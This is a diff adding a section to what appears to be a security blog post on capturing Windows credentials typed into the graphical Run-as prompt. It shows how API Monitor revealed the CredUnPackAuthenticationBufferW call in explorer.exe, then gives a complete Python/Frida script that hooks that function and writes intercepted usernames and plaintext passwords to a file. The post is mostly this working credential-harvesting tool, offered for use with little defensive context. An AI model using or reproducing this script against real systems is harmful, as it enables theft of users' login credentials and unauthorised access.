@@ -149,3 +149,87 @@ if __name__ == "__main__":
 Great! lets try to run the script:
 
 ![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/RunasScript.png)
+
+
+
+## Credentials Prompt  (A.K.A Graphical Runas)
+
+![](C:\Users\ilanka\Documents\GitHub\IlanKalendarov.github.io\Images\GraphicalRunas.png)
+
+   
+
+At this point its pretty easy, Implementing the steps like we did with the CLI version of runas. Lets fire up API Monitor. Using the process locator option in API Monitor we could see that the process is actually `explorer.exe`:
+
+ ![](C:\Users\ilanka\Documents\GitHub\IlanKalendarov.github.io\Images\processLocator.png)
+
+Using the steps like we did before I was able to find that the function `CredUnPackAuthenticationBufferW` from `Credui.dll` was called.
+
+According to Microsoft docs:
+
+>  The CredUnPackAuthenticationBuffer function converts an authentication buffer returned by a call to the [CredUIPromptForWindowsCredentials](https://docs.microsoft.com/en-us/windows/desktop/api/wincred/nf-wincred-creduipromptforwindowscredentialsa) function into a string user name and password.
+
+All left to do is to write our JavaScript and python scripts, Final script should look like this:
+
+```python
+# Wrriten by Ilan Kalendarov
+
+from __future__ import print_function
+import frida
+from time import sleep
+import psutil
+from threading import Lock, Thread
+import sys
+
+def on_message_credui(message, data):
+	# Executes when the user enters the credentials inside the Graphical runas prompt.
+	# Then, open a txt file and appends the data.
+	print(message)
+	if message['type'] == "send":
+		with open("Creds.txt", "a") as f:
+			f.write(message["payload"] + '\n')
+
+
+def CredUI():
+	# Explorer is always running so no while loop is needed.
+
+	# Attaching to the explorer process
+	session = frida.attach("explorer.exe")
+
+	# Executing the following javascript
+	# We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
+	script = session.create_script("""
+
+	var username;
+	var password;
+	var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")
+
+	Interceptor.attach(CredUnPackAuthenticationBufferW, {
+		onEnter: function (args) 
+		{
+
+			username = args[3];
+			password = args[7];
+		},
+		onLeave: function (result)
+		{
+		   
+			var user = username.readUtf16String()
+			var pass = password.readUtf16String()
+
+			if (user && pass)
+			{
+				send("\\n+ Intercepted CredUI Credentials\\n" + user + ":" + pass)
+			}
+		}
+	});
+
+	""")
+	# If we found the user and pass then execute "on_message_credui" function
+	script.on('message', on_message_credui)
+	script.load()
+	sys.stdin.read()
+    
+if __name__ == "__main__":
+	CredUI()
+```
+
